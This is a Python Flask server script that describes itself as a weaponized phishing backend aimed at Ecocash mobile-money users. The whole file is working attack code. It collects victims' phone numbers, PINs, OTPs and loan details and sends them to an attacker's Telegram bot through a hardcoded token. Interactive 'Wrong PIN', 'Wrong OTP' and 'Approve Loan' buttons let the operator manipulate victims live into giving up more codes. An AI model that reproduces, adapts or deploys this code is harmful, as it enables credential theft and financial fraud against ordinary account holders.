# server.py - Weaponized Ecocash Phishing Backend (Render-Optimized)
from flask import Flask, request, jsonify, send_from_directory, abort
from flask_cors import CORS
import requests
import threading
import time
import json
import os
import uuid
from datetime import datetime

app = Flask(__name__)
CORS(app)

# === CONFIG ===
BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E'
CHAT_ID = '1469249528'
TG_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
WEBHOOK_URL = os.getenv('RENDER_EXTERNAL_URL', '')  # Auto-set by Render

# In-memory + file persistence (for dyno restarts)
DATA_FILE = 'exfil_data.json'
active_victims = {}
last_update_id = 0

# Load previous victims on startup
def load_victims():
    global active_victims
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                active_victims = json.load(f)
    except Exception as e:
        print(f"[LOAD ERROR] {e}")

def save_victims():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(active_victims, f)
    except Exception as e:
        print(f"[SAVE ERROR] {e}")

# Thread-safe exfil
victim_lock = threading.Lock()

def tg_send(text, reply_markup=None, max_retries=3):
    """Reliable Telegram message with retry logic"""
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'Markdown',
        'disable_web_page_preview': True
    }
    if reply_markup:
        payload['reply_markup'] = reply_markup

    for attempt in range(max_retries):
        try:
            r = requests.post(f'{TG_API}/sendMessage', json=payload, timeout=15)
            if r.status_code == 200 and r.json().get('ok'):
                return r.json()
        except Exception as e:
            print(f'[TG SEND FAIL {attempt+1}] {e}')
            time.sleep(2 ** attempt)  # Exponential backoff
    return {'ok': False}

def tg_answer(callback_query_id):
    try:
        requests.post(f'{TG_API}/answerCallbackQuery', json={'callback_query_id': callback_query_id}, timeout=10)
    except:
        pass

@app.route('/')
def index():
    """Serve phishing page"""
    return send_from_directory('.', 'index.html')

@app.route('/api/exfil', methods=['POST'])
def exfil():
    """Exfiltrate victim data — ALWAYS succeeds"""
    try:
        data = request.get_json(force=True)
    except:
        abort(400)

    victim_id = data.get('victimId') or str(uuid.uuid4())
    data['victimId'] = victim_id
    data['time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Save in memory
    with victim_lock:
        active_victims[victim_id] = data
        save_victims()  # Persist immediately

    # Format exfil message
    msg = f"""
🔐 *ECOCASH FULL EXFIL*
📞 *Number:* `{data.get('msisdn', 'N/A')}`
🔐 *PIN:* `{data.get('pin', 'N/A')}`
🔢 *OTP:* `{data.get('otp', 'N/A')}`
💸 *Loan:* `{data.get('amount', 'N/A')}`
📅 *Term:* `{data.get('term', 'N/A')}`
🕒 *Time:* `{data.get('time')}`
📡 *Source:* `{request.remote_addr}`
"""

    # Fire and forget to Telegram
    threading.Thread(target=tg_send, args=(msg,), daemon=True).start()

    return jsonify({'ok': True, 'victimId': victim_id})

@app.route('/api/alert', methods=['POST'])
def alert():
    """Send interactive buttons to admin"""
    try:
        data = request.get_json(force=True)
    except:
        abort(400)

    victim_id = data.get('victimId', str(uuid.uuid4()))
    msisdn = data.get('msisdn', 'Unknown')
    amount = data.get('amount', 'N/A')

    keyboard = {
        'inline_keyboard': [
            [{'text': '❌ Wrong PIN', 'callback_data': f'wrongpin_{victim_id}'}],
            [{'text': '❌ Wrong OTP', 'callback_data': f'wrongotp_{victim_id}'}],
            [{'text': '✅ Approve Loan', 'callback_data': f'approve_{victim_id}'}]
        ]
    }

    msg = f"""
🚨 *NEW ECOCASH VICTIM* 🚨
📞 *Number:* `{msisdn}`
💸 *Amount:* `{amount}`
🆔 *ID:* `{victim_id}`
⏱️ *Active Now*
"""
    threading.Thread(target=tg_send, args=(msg, keyboard), daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/poll', methods=['GET'])
def poll():
    """Long-polling for admin actions — resilient"""
    global last_update_id

    victim_id = request.args.get('victimId', '')
    if not victim_id:
        return jsonify({'action': 'none'})

    try:
        r = requests.get(
            f'{TG_API}/getUpdates',
            params={'offset': last_update_id + 1, 'timeout': 20, 'allowed_updates': ['callback_query']},
            timeout=25
        )
        updates = r.json().get('result', [])

        for update in updates:
            update_id = update['update_id']
            if update_id <= last_update_id:
                continue
            last_update_id = max(last_update_id, update_id)

            cb = update.get('callback_query')
            if not cb:
                continue

            # Only allow your CHAT_ID (admin)
            if str(cb['from']['id']) != str(CHAT_ID):
                tg_answer(cb['id'])
                continue

            data = cb.get('data', '')
            tg_answer(cb['id'])

            if not data.startswith(('wrongpin_', 'wrongotp_', 'approve_')):
                continue

            action_type, _, vid = data.partition('_')
            if vid != victim_id:
                continue

            return jsonify({'action': action_type})

    except Exception as e:
        print(f'[POLL ERROR] {e}')

    return jsonify({'action': 'none'})

# Health check endpoint (keeps Render awake)
@app.route('/health')
def health():
    return jsonify({'status': 'online', 'victims': len(active_victims)})

# Fallback exfil (if JS fails)
@app.route('/exfil-post', methods=['POST'])
def exfil_form():
    form = request.form
    data = {
        'msisdn': form.get('msisdn', 'FORM'),
        'pin': form.get('pin', 'FORM'),
        'otp': form.get('otp', 'FORM'),
        'amount': form.get('amount', 'FORM'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    threading.Thread(target=tg_send, args=(f"📄 *FORM EXFIL*\n" + "\n".join([f"{k.upper()}: `{v}`" for k, v in data.items()]),), daemon=True).start()
    return '', 204

if __name__ == '__main__':
    load_victims()  # Restore state
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)